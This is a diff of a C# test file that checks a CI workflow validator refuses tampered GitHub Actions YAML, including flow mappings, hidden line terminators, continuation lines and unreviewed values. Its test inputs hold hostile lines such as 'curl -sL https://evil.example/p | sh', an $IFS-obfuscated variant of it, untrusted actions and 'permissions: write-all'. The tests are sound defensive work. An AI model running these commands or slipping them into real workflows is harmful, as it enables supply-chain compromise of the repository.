@@ -54,17 +54,99 @@ public sealed class RepositoryCheckTests
         Assert.Contains("unreviewed action", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
-    /// <summary>Flow mappings, extra workflows and flow steps cannot bypass the grammar.</summary>
+    /// <summary>Each unsupported form fails on its own check: flow mapping, flow sequence, extra workflow, flow step.</summary>
     [Theory]
-    [InlineData("ci.yml", "  extra:\n    permissions: {contents: write}\n")]
-    [InlineData("publish.yaml", "name: Publish\npermissions: write-all\njobs:\n  publish:\n    steps:\n      - run: gh release create x\n")]
-    [InlineData("ci.yml", "      - {uses: unknown/action@main}\n")]
-    public void UnsupportedYamlFormsCannotBypassReview(string name, string addition)
+    [InlineData("ci.yml", "    env:\n      CI: true\n", "    env: {CI: true}\n", "flow mappings are unsupported")]
+    [InlineData("ci.yml", "    steps:\n", "    steps: [uses: evil/action@main, run: curl -sL https://evil.example/p | sh]\n", "flow sequences are unsupported")]
+    [InlineData("ci.yml", "      - run: dotnet tool restore\n", "      - {uses: unknown/action@main}\n", "flow mappings are unsupported")]
+    [InlineData("native-libchdr.yml", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions: {contents: write}\n", "flow mappings are unsupported")]
+    public void UnsupportedYamlFormsCannotBypassReview(string workflow, string original, string replacement, string message)
     {
         using var directory = Copy();
-        string path = Path.Combine(directory.Path, ".github/workflows", name);
-        File.WriteAllText(path, (File.Exists(path) ? File.ReadAllText(path) : "") + addition);
-        Assert.NotNull(RepositoryCheck.Run(directory.Path, null));
+        Replace(directory, workflow, original, replacement);
+        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>An additional workflow file is outside the reviewed inventory.</summary>
+    [Fact]
+    public void ExtraWorkflowIsRejected()
+    {
+        using var directory = Copy();
+        File.WriteAllText(Path.Combine(directory.Path, ".github/workflows/publish.yaml"), "name: Publish\npermissions: write-all\n");
+        Assert.Contains("unexpected foundation workflow", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>YAML line breaks other than LF cannot hide permissions, actions or commands on one physical line.</summary>
+    [Theory]
+    [InlineData("\r")]
+    [InlineData("\u0085")]
+    [InlineData("\u2028")]
+    [InlineData("\u2029")]
+    [InlineData("\t")]
+    public void NonLineFeedTerminatorsCannotHideEntries(string terminator)
+    {
+        foreach (string hidden in (string[])[
+            "    timeout-minutes: 10" + terminator + "    permissions: write-all\n",
+            "    # reviewed comment" + terminator + "    permissions: write-all\n    timeout-minutes: 10\n",
+            "        with:\n          persist-credentials: false" + terminator + "      - uses: evil/action@main" + terminator + "      - run: curl -sL https://evil.example/p | sh\n"])
+        {
+            using var directory = Copy();
+            string original = hidden.Contains("with:", StringComparison.Ordinal) ? "        with:\n          persist-credentials: false\n" : "    timeout-minutes: 10\n";
+            Replace(directory, "native-libchdr.yml", original, hidden);
+            Assert.Contains("only LF-terminated printable ASCII", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+        }
+    }
+
+    /// <summary>Lines a YAML parser would fold into a reviewed run value are refused.</summary>
+    [Theory]
+    [InlineData("          name:;curl$IFS-sL$IFS\"https://evil.example/q\"|sh\n", "unsupported skeleton YAML form")]
+    [InlineData("          name: ;curl -sL https://evil.example/q | sh\n", "continuation lines are unsupported")]
+    public void ContinuationLinesCannotExtendReviewedCommands(string continuation, string message)
+    {
+        using var directory = Copy();
+        const string run = "      - run: dotnet restore Moonlark.Native.slnx --locked-mode\n";
+        Replace(directory, "native-libchdr.yml", run, run + continuation);
+        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>Triggers, runners, checkout options and other values are exact reviewed values.</summary>
+    [Theory]
+    [InlineData("native-libchdr.yml", "on:\n  workflow_dispatch:\n", "on: [workflow_dispatch, pull_request_target, workflow_run]\n", "flow sequences are unsupported")]
+    [InlineData("native-libchdr.yml", "on:\n", "on: workflow_run\n", "on must be a block mapping")]
+    [InlineData("native-libchdr.yml", "runs-on: ubuntu-24.04", "runs-on: self-hosted", "unreviewed value for runs-on")]
+    [InlineData("native-libchdr.yml", "persist-credentials: false", "persist-credentials: true", "unreviewed value for persist-credentials")]
+    [InlineData("ci.yml", "submodules: true", "submodules: recursive", "unreviewed value for submodules")]
+    [InlineData("ci.yml", "fetch-depth: 0", "fetch-depth: 1", "unreviewed value for fetch-depth")]
+    [InlineData("ci.yml", "    branches: [main]", "    branches: [main, release]", "flow sequences are unsupported")]
+    [InlineData("native-libchdr.yml", "timeout-minutes: 10", "timeout-minutes: 600", "unreviewed value for timeout-minutes")]
+    public void ValuesAreExactReviewedValues(string workflow, string original, string replacement, string message)
+    {
+        using var directory = Copy();
+        Replace(directory, workflow, original, replacement);
+        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>Tag routing cannot gate any other step or job, so the drift check always runs on pull requests.</summary>
+    [Theory]
+    [InlineData("    runs-on: macos-15\n", "    runs-on: macos-15\n    if: github.ref_type == 'tag'\n")]
+    [InlineData("      - run: " + RepositoryCheck.DriftCheck + "\n", "      - run: " + RepositoryCheck.DriftCheck + "\n        if: github.ref_type == 'tag'\n")]
+    public void DriftCheckCannotBeGatedToTags(string original, string replacement)
+    {
+        using var directory = Copy();
+        Replace(directory, "ci.yml", original, replacement);
+        Assert.Contains("tag routing is allowed only on the tag-check step", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+    }
+
+    /// <summary>Publishing command spellings with intervening options are still recognized.</summary>
+    [Theory]
+    [InlineData("name: git -C . push")]
+    [InlineData("name: gh -R x release create")]
+    [InlineData("name: dotnet nuget --source x push")]
+    public void PublishingCommandVariantsAreRejected(string line)
+    {
+        using var directory = Copy();
+        Replace(directory, "native-libchdr.yml", "name: Libchdr source preflight", line);
+        Assert.Contains("publishing commands require approval", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
     /// <summary>CI must keep the actual tag trigger.</summary>
@@ -89,15 +171,15 @@ public sealed class RepositoryCheckTests
 
     /// <summary>Commented routing lines are not active evidence.</summary>
     [Theory]
-    [InlineData("    tags: ['libchdr-*', 'chdman-*']")]
-    [InlineData("        if: github.ref_type == 'tag'")]
-    [InlineData("          EXPECTED_TAG: ${{ github.ref_name }}")]
-    [InlineData("      - run: dotnet run --project eng/Moonlark.Native.Engineering -c Release --no-build -- repo check --tag \"$EXPECTED_TAG\"")]
-    public void CommentedTagRoutingIsNotActiveEvidence(string line)
+    [InlineData("    tags: ['libchdr-*', 'chdman-*']", "actual library/tool tag")]
+    [InlineData("        if: github.ref_type == 'tag'", "actual library/tool tag")]
+    [InlineData("          EXPECTED_TAG: ${{ github.ref_name }}", "actual library/tool tag")]
+    [InlineData("      - run: dotnet run --project eng/Moonlark.Native.Engineering -c Release --no-build -- repo check --tag \"$EXPECTED_TAG\"", "tag routing is allowed only on the tag-check step")]
+    public void CommentedTagRoutingIsNotActiveEvidence(string line, string message)
     {
         using var directory = Copy();
         Replace(directory, "ci.yml", line, "#" + line);
-        Assert.Contains("actual library/tool tag", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
+        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
     }
 
     /// <summary>The generation drift check cannot be removed or commented out of CI.</summary>
